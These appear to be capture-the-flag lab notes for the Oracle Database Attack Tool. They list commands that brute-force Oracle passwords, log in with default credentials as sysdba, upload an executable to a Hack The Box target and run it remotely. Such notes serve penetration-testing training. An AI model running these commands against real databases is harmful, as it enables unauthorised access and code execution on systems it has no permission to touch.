# Tools
-  [Oracle Database Attack Tool (ODAT)](https://github.com/quentinhardy/odat)
```
All checks:
./odat.py all -s 10.10.10.82 -p 1521

Guess passwords:
./odat.py passwordguesser -d XE -s 10.10.10.82 -p 1521 --accounts-file /root/HTB/tools/db/odat/accounts/accounts.txt

Upload file:
./odat.py utlfile -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --sysdba --putFile c:/ writeup.exe ~/HTB/silo/writeup.exe

Execute file:
./odat.py externaltable -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --sysdba --exec c:/ writeup.exe
```
